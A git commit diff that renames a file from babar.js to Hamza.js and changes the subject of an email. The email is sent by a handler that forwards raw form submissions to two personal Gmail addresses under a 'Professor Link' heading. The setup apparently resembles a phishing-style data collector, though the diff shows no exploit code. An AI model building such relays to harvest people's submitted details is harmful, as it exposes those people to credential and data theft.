41b050c2e774ad126a23722c7ab94d3f67183bf5
linkquarry-hub <linkquarry@gmail.com>
2025-11-24 12:37:56 +0500

    Update and rename babar.js to Hamza.js

--- Hamza.js
+++ Hamza.js
@@ -42,7 +42,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <hgfver414@gmail.com>`,
       to: "linkquarry@gmail.com,fahadali123gg@gmail.com",
-      subject: "babar",
+      subject: "Hamza",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(
         formData,
